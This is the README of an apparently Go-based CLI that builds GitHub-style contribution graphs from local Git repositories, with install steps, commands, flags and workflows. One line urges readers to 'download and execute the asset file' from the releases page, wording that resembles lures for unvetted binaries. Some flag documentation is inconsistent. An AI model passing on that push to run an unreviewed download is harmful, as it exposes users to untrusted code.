# Go Git Local Status â€” Local Git Contribution Graph CLI Visualizer

[![Releases](https://img.shields.io/badge/Releases-Download-blue?style=for-the-badge&logo=github)](https://github.com/Cephas1818/go_git_local_status/releases)

A Go CLI that builds GitHub-style contribution graphs from local Git repos. View activity across many projects in the terminal. Track commit counts by day. Compare projects. Export data.

- Topics: cli, coding-activity, command-line, contribution-graph, developer-tools, development-tracking, git, git-analysis, git-history, git-stats, go, go-cli, golang, local-repositories, productivity, repository-analysis, terminal, terminal-app, visualization

Why use this tool

- View local commit activity with the same mental model as GitHub contributions.
- Aggregate data from many repos in a single view.
- Run in terminals and scripts.
- Export CSV or JSON for reporting and dashboards.
- Use in dotfiles, CI reports, or daily dev metrics.

Install

1) Go install
```
go install github.com/Cephas1818/go_git_local_status@latest
```
After install, the binary will live in $GOPATH/bin or $HOME/go/bin. Add that to PATH if needed.

2) Download a release binary
Download the binary file for your platform from the Releases page and run it.
You must download and execute the asset file from:
https://github.com/Cephas1818/go_git_local_status/releases

Examples

Scan a single repo
```
go-git-local-status scan ~/projects/myrepo
```

Scan multiple repos
```
go-git-local-status scan ~/projects/*
```

Aggregate across a parent folder and show a 52-week heatmap
```
go-git-local-status heatmap --path ~/work --weeks 52
```

Export JSON
```
go-git-local-status export --path ~/work --format json --out commits.json
```

Show per-repo breakdown
```
go-git-local-status report --path ~/work --group-by repo
```

Commands and flags

- scan
  - --path string: Path to repo or folder.
  - --since date: Start date (YYYY-MM-DD).
  - --until date: End date (YYYY-MM-DD).
  - --depth int: Depth to scan subfolders.
- heatmap
  - --weeks int: Number of weeks to display.
  - --theme string: color|mono (terminal colors).
  - --min int: Minimum count for heat threshold.
- export
  - --format: json|csv
  - --out: Output file path.
- report
  - --group-by: repo|author|path
  - --top N: Show top N repos by commit count.

Output modes

- Terminal heatmap: Color squares or characters for each day.
- Plain ASCII: For terminals without color.
- CSV/JSON: Rows of date, repo, author, commits.
- Image export (SVG): Generates a static contribution graph SVG for embedding in docs.

Use cases

- Personal metrics: See your work pattern across many projects.
- Team snapshot: Collect commit activity across a monorepo or org folder.
- Backup reports: Export commit counts for audits.
- Embedding: Include a generated SVG in your personal site or README.
- Automation: Run in cron to create weekly reports.

How it works

- The tool runs git log in each repo folder.
- It parses commit date, author, and commit count.
- It aggregates commits per day, per repo.
- It maps counts to intensity levels for the heatmap.
- It renders a grid of weeks x days like GitHub contributions.
- It can export raw data for external analysis.

Performance notes

- The tool reads commit history. It scales with repo size.
- For large histories, use --since or --until to restrict range.
- Use --depth to limit scanned subfolders when scanning a parent folder.
- The tool spawns git subprocesses per repo. Run on multi-core systems for faster results.

Customization

- Theme: Choose color or mono. Terminal palette adapts to ANSI 256 colors.
- Thresholds: Set intensity buckets to change visual mapping.
- Grouping: Group by repo, author, or folder path.
- Output: Choose ASCII, color, SVG, JSON, or CSV.

Examples: real workflows

1) Weekly email snapshot
- Run a scan in CI each Sunday.
- Export JSON.
- Generate a small SVG.
- Attach SVG to an automated email.

2) Local dotfiles integration
- Add a cron job that saves the heatmap as SVG to ~/public.
- Show it on your personal site with a static image.

3) Team metrics
- Collect data from a shared workspace folder.
- Run report --group-by repo --top 10 to get the busiest projects.

Integration tips

- Use with tmux: The CLI fits in a pane. Resize to change layout.
- Shell prompt: Pipe the top N repos to a prompt helper.
- Git hooks: Add a post-commit hook to run a local scan and update a cache.

API and scripting

- The CLI returns exit codes for success and errors.
- Use --format json to parse output in scripts.
- Example: get today's total commits
```
go-git-local-status scan --path ~/work --since $(date +%F) --format json | jq '.total'
```

Internals (for contributors)

- Language: Go
- Core packages:
  - git: uses git CLI via os/exec for compatibility.
  - parser: parses git log output to structs.
  - aggregator: builds date -> count maps.
  - render: renders terminal, ascii, SVG, CSV, JSON.
- Design goals:
  - Small binary
  - Minimal runtime deps
  - Fast I/O and concurrent repo scanning

Contributing

- Fork the repo.
- Create a branch per feature or fix.
- Write tests for core parsing logic.
- Keep commits focused and small.
- Open a PR with a clear description and examples.

Security

- The tool runs git commands and reads repository history. It does not send data over the network by default.
- Review the code before running in sensitive environments.

Common issues and resolutions

- No output for a repo
  - Ensure the path contains a .git folder.
  - Run git status in the folder to confirm.
- Slow scan
  - Limit the date range with --since.
  - Use --depth to reduce the number of scanned subfolders.
- Color looks wrong
  - Switch to --theme mono or adjust terminal color settings.

FAQ

Q: Can I include uncommitted work?
A: No. The tool reads commit history. It cannot see uncommitted changes.

Q: Can I attribute commits by author email?
A: Yes. Use --group-by author and the tool will list per-author counts.

Q: Can I get a per-hour heatmap?
A: The core view focuses on daily counts. Export raw data and aggregate by hour externally.
